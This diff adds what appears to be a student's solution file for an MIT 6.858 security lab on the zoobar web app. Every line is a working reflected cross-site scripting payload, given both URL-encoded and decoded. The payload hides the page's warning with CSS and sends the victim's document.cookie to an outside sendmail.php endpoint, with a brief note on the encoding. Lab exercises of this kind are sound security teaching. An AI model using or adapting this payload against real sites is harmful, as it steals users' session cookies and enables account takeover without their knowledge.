@@ -1,0 +1,8 @@
+http://localhost:8080/zoobar/index.cgi/users?user=%22%22%20size%3D10%3E%20%3Cstyle%3E.warning%7Bdisplay%3Anone%7D%20.nobr%7Bmargin-left%3A%204px%7D%3C%2Fstyle%3E%20%3Cscript%3E%20(new%20Image()).src%3D%27http%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2019%2Flabs%2Fsendmail.php%3F%27%20%2B%20%27to%3Ddamianb%40mit.edu%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random()%3B%20%3C%2Fscript%20&random=696969
+
+
+'"" size=10> <style>.warning{display:none} .nobr{margin-left: 4px}</style> <script> (new Image()).src='http://css.csail.mit.edu/6.858/2019/labs/sendmail.php?' + 'to=damianb@mit.edu' + '&payload=' + encodeURIComponent(document.cookie) + '&random=' + Math.random(); </script '
+
+Ignore the '', become ->
+
+%22%22%20size%3D10%3E%20%3Cstyle%3E.warning%7Bdisplay%3Anone%7D%20.nobr%7Bmargin-left%3A%204px%7D%3C%2Fstyle%3E%20%3Cscript%3E%20(new%20Image()).src%3D%27http%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2019%2Flabs%2Fsendmail.php%3F%27%20%2B%20%27to%3Ddamianb%40mit.edu%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random()%3B%20%3C%2Fscript%20
